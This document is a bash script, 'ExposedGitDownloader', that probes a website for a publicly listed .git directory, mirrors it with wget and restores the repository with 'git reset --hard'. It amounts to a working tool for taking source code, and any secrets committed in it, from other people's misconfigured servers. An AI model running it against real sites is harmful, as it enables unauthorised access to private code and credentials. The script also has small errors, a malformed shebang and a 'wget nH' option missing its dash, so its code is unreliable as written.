#/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

header() {
  echo "ExposedGitDownloader - download and restore repository by exposed .git directory"
  echo ""
}

process_website() {
  url=$1

  printf "${YELLOW}[!] ${NC} Checking ${url}... \n"

  isGitDirectoryExposed=$(wget $url/.git -q -O - | grep "Index of")

  if [[ ! -z "$isGitDirectoryExposed" ]] ; then
      printf "${GREEN}[+] ${NC} SUCCESS: git exposed\n"
      printf "[ ]  Downloading...\n"

      wget nH --quiet --mirror --no-parent --connect-timeout=3 --tries=1 --page-requisites --directory-prefix=./ --convert-links $url/.git/

      if [ -f "./${url}/.git/HEAD" ]; then
          printf "${GREEN}[+] ${NC} Git directory synchronized \n"

          printf "[ ]  Resetting HEAD of project \n"
          cd $url
          git reset --hard
          cd ../

      else
          printf "${RED}[x] ${NC} Git directory IS NOT synchronized \n"
      fi
  else
      printf "${RED}[x] ${NC} Git directory IS NOT exposed \n"
  fi
}

check_requirements() {
  if ! command -v git &> /dev/null
  then
      header
      echo "${RED}GIT could not be found - please install${NC}"
      exit
  fi

  if ! command -v wget &> /dev/null
  then
      header
      echo "${RED}WGET could not be found - please install${NC}"
      exit
  fi
}

show_help() {
  header
  echo "Usage: '`basename $0` URL' or '`basename $0` --help'"
}

if [[ ! -z "$1" ]] ; then
  check_requirements

  process_website $1
else
  show_help
fi
